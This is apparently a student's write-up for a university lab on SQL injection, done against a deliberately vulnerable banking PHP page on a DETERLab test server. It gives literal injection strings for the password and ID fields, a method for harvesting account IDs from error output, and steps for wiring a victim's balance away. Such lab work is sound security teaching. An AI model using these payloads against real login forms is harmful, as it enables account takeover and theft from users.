For part 3, you are required not to submit an executable exploit, but
instead a transcript of all steps required.

For example, if the task was "log on to CourseWeb", a transcript would
look like:

1. go to http://courseweb.seas.ucla.edu/
2. click LOGIN
3. In the username window, enter your username
4. in the password window, enter your password.
5. Click submit.

The transcript should include *ALL* input or actions required to
perform each task in the assignment.

*For each of the following tasks, I am assuming SSH Tunneling has been performed with a command similar to: ssh la136bn@users.deterlab.net -L 8118:server.assignment3.UCLA136.isi.deterlab.net:80

Q: Show how you can log into an account without knowing any id
numbers ahead of time.

1. Go to http://localhost:8118/cgi-bin/FCCU.php
2. In the Account ID Number box, enter: 1
3. In the Password box, enter: test' OR password!='i
4. The query should be: SELECT * FROM accounts WHERE id = 1 AND password = 'testing' OR password!=''
5. You will now be logged into the first account in the table such that 1=1 or password!='' is true, which includes all accounts. You should be in Camille Cantu's account

Q: Show how you can log into *every* account without knowing any
particular id numbers ahead of time. (You can use any id numbers you
discover during the attack but you can't use your "inside knowledge"
of the SQL server.)

1. From Camille's account, pick a target from the employee list
2. Attempt to transfer $0 to them
3. SQL will spit out a failed query with your target's ID at the end, such as:
	SELECT bal FROM accounts WHERE id = 1 or 1=1 -- OR id = 9916
(where id=9916 belongs to Hope Bolden)
4. Log out
5. In the Account ID Number box, enter: 9916 --
6. In the Password box, enter: test
7. The query should be: SELECT * FROM accounts WHERE id = 9916 -- AND password = 'test'
8. You will now be logged into Hope Bolden's (or the intended target's) account

Q: Make some account (your choice) wire its total balance to the bank
with routing number "314159265" and account number "271828182845".

1. Use the above methods to choose an account id to target (say, 9916)
2. Log out of whatever account you currently are in
3. In the Account ID Number Box, enter: 9916
4. In the Password box, enter: testing' OR id=9916 AND password!='
5. The query should be: SELECT * FROM accounts WHERE id = 9916 AND password = 'testing' OR id=9916 AND password!=' '
6. Fill in the bank routing number (314159265) and account number (271828182845)
7. For funds to transfer, input the target's total balance
8. Click on the wire submit button; this works because the software reverses the order of the password and id fields in the query here, so we end up with a query much like: UPDATE accounts SET bal = 0 WHERE password = 'testing' OR id=9916 AND password!=' ' AND id = 9916 LIMIT 1

Q: Explain why you can't create a new account or arbitrarily update
account balances (or show that you can).

It is not possible to create a new account or update account balances using the interface we are provided. Since we do not have the SQL shell to run commands, our only means of communication with the database is through the PHP. However, there are several different reasons preventing an attacker from executing these commands. First of all, the PHP code has already specified queries prefixed with "SELECT...," and variables that come after the fact cannot change the command to "UPDATE" or "INSERT INTO" and so on. And although the attacker could try to end the previous SELECT query prematurely, followed by, say, a custom INSERT INTO query statement and final "--" comment, the PHP to SQL (via HTTP POST) interface will not allow the second statement to be executed, since it is on the same line as the command before it. Obviously, if we obtained root or shell access to SQL, this would be a different story.

Q: Estimate how much time you spent on this lab (all 3 parts).
20-25 hours

Fix the vulnerability in the FCCU.php application and any other tasks
in the lab manual.
Done.
